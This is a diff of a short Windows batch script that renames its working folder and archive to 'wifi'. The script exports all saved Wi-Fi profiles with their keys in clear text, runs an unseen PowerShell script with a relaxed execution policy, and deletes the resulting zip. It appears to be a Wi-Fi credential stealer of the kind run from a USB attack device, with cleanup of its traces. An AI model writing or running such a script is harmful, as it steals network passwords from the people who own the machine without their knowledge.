@@ -1,7 +1,7 @@
 cd Desktop
-mkdir A
-cd A
+mkdir wifi
+cd wifi
 netsh wlan export profile key=clear 
 cd ..
 Powershell.exe -executionpolicy remotesigned -File Test.ps1
-del A.zip
+del wifi.zip
